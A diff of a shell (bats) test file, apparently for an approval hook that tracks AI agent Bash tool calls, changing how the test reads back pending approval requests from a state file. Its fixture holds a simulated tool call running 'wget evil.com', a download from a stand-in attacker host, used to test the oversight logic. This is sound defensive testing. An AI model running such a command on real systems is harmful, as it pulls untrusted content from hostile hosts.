@@ -54,10 +54,8 @@ setup() {
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
 
-  bats_run_zsh "${approvalPrefix}; approvalRequestGet --tool-use-id toolu_01"
-  [[ "$output" = "" ]]
-  bats_run_zsh "${approvalPrefix}; approvalRequestGet --tool-use-id toolu_02"
-  [[ "$output" = "curl" ]]
+  local stateFile="$BATS_TMP_DIR/test/state.json"
+  [[ "$(jq --compact-output '.preToolUse.Bash.approvalRequest' "$stateFile")" = '[{"toolUseId":"toolu_02","commands":["curl"]}]' ]]
 }
 
 @test "post event for an unknown tool use id changes nothing" {
